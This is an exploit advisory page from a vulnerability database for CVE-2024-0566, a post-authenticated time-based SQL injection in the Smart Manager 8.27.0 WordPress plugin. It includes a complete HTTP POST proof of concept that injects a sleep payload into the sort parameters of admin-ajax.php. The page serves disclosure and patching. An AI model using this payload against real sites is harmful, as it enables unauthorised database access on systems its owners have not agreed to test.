---
title: Smart Manager 8.27.0 Post-Authenticated SQL Injection
url: https://cxsecurity.com/issue/WLB-2025050001
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-05-02
fetch_date: 2025-10-06T22:27:20.373446
---

# Smart Manager 8.27.0 Post-Authenticated SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Smart Manager 8.27.0 Post-Authenticated SQL Injection** **2025.05.01**  Credit:  **[xbz0n](https://cxsecurity.com/author/xbz0n/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-0566](https://cxsecurity.com/cveshow/CVE-2024-0566/ "Click to see CVE-2024-0566")**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

# Exploit Title: Smart Manager 8.27.0 - Post-Authenticated SQL Injection
# Date: 2024-01-18
# Exploit Author: Ivan Spiridonov - xbz0n
# Vendor Homepage: https://www.storeapps.org/
# Software Link: https://www.storeapps.org/product/smart-manager/
# Version: 8.27.0
# Tested on: Ubuntu 22.04
# CVE: CVE-2024-0566
## SQL Injection
The plugin does not properly sanitize and escape a parameter before using it in an SQL statement, leading to an SQL injection exploitable by high-privilege users such as admin.
## Affected Components
- \*\*Plugin:\*\* Smart Manager
- \*\*Version:\*\* 8.27.0
- \*\*Affected Parameters:\*\* 'sort\_params%5BsortOrder%5D', 'sort\_params%5Bcolumn%5D'
- \*\*Affected Endpoint:\*\* /wp-admin/admin-ajax.php
## Description
The vulnerability is located within the admin AJAX endpoint in the sorting parameters 'sort\_params%5BsortOrder%5D' and 'sort\_params%5Bcolumn%5D'. By manipulating these parameters, authenticated attackers can inject SQL commands, leading to a time-based SQL Injection vulnerability.
## Proof of Concept
### Manual Exploitation
```http
POST /wp-admin/admin-ajax.php?action=sm\_beta\_include\_file HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/plain, \*/\*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://localhost/wp-admin/admin.php?page=smart-manager
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 1117
Origin: http://localhost
Connection: close
Cookie: Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
cmd=get\_data\_model&active\_module=product&security=37e8d818b7&is\_public=1&sm\_page=1&sm\_limit=50&SM\_IS\_WOO30=true&sort\_params%5Bcolumn%5D=postmeta%2Fmeta\_key%3D\_tax\_status%2Fmeta\_value%3D\_tax\_status&sort\_params%5BsortOrder%5D=asc%2c(select\*from(select(sleep(20)))a)&table\_model%5Bposts%5D%5Bpkey%5D=ID&table\_model%5Bposts%5D%5Bjoin\_on%5D=&table\_model%5Bposts%5D%5Bwhere%5D%5Bpost\_type%5D%5B%5D=product&table\_model%5Bposts%5D%5Bwhere%5D%5Bpost\_type%5D%5B%5D=product\_variation&table\_model%5Bposts%5D%5Bwhere%5D%5Bpost\_status%5D=any&table\_model%5Bpostmeta%5D%5Bpkey%5D=post\_id&table\_model%5Bpostmeta%5D%5Bjoin\_on%5D=postmeta.post\_ID+%3D+posts.ID&table\_model%5Bterm\_relationships%5D%5Bpkey%5D=object\_id&table\_model%5Bterm\_relationships%5D%5Bjoin\_on%5D=term\_relationships.object\_id+%3D+posts.ID&table\_model%5Bterm\_taxonomy%5D%5Bpkey%5D=term\_taxonomy\_id&table\_model%5Bterm\_taxonomy%5D%5Bjoin\_on%5D=term\_taxonomy.term\_taxonomy\_id+%3D+term\_relationships.term\_taxonomy\_id&table\_model%5Bterms%5D%5Bpkey%5D=term\_id&table\_model%5Bterms%5D%5Bjoin\_on%5D=terms.term\_id+%3D+term\_taxonomy.term\_id&search\_text=&advanced\_search\_query=%5B%5D&is\_view=0&isTasks=0&is\_taxonomy=0
```
If the server response is delayed by approximately 20 seconds, it indicates a successful exploitation of the time-based SQL Injection, confirming the vulnerability.
## Recommendations
Users of Smart Manager v8.27.0 are strongly advised to restrict access to the affected endpoint and update the plugin to the latest version.

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025050001)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top